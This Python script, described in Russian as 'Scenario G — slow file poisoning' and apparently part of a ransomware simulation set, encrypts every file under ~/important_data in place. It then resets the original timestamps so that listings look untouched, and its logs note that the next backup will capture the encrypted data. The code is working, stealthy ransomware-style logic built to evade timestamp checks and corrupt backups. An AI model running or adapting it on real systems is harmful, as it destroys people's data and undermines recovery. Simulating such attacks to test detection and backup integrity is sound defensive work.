#!/usr/bin/env python3
"""
Сценарий G — медленное отравление файлов.
Подменяет содержимое файлов сохраняя временные метки.
Внешне файлы выглядят нетронутыми — ls -la показывает
те же даты. Только SHA-256 хеш изменяется.
"""
import os, logging
from pathlib import Path
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('/tmp/sim_g.log'),
              logging.StreamHandler()])
log = logging.getLogger(__name__)
KEY = Fernet.generate_key()
CIPHER = Fernet(KEY)
open('/tmp/key_g.key','wb').write(KEY)

target = Path(os.path.expanduser('~/important_data'))
poisoned = 0

sample = target / 'readable' / 'doc_1.txt'
if sample.exists():
    stat_before = sample.stat()
    log.info(f'BEFORE: mtime={stat_before.st_mtime}, size={stat_before.st_size}')

for f in target.rglob('*'):
    if not f.is_file(): continue
    try:
        stat = f.stat()
        atime, mtime = stat.st_atime, stat.st_mtime

        f.write_bytes(CIPHER.encrypt(f.read_bytes()))

        os.utime(f, (atime, mtime))

        log.info(f'POISONED (timestamps preserved): {f.name}')
        poisoned += 1
    except Exception as e:
        log.error(f'ERROR: {f}: {e}')

if sample.exists():
    stat_after = sample.stat()
    log.warning(f'AFTER: mtime={stat_after.st_mtime}, size={stat_after.st_size}')
    log.warning('Note: mtime UNCHANGED but content is now encrypted')

log.warning(f'=== POISONING COMPLETE: {poisoned} files ===')
log.warning('Files look intact by ls -la — timestamps unchanged')
log.warning('Next backup will archive POISONED data!')
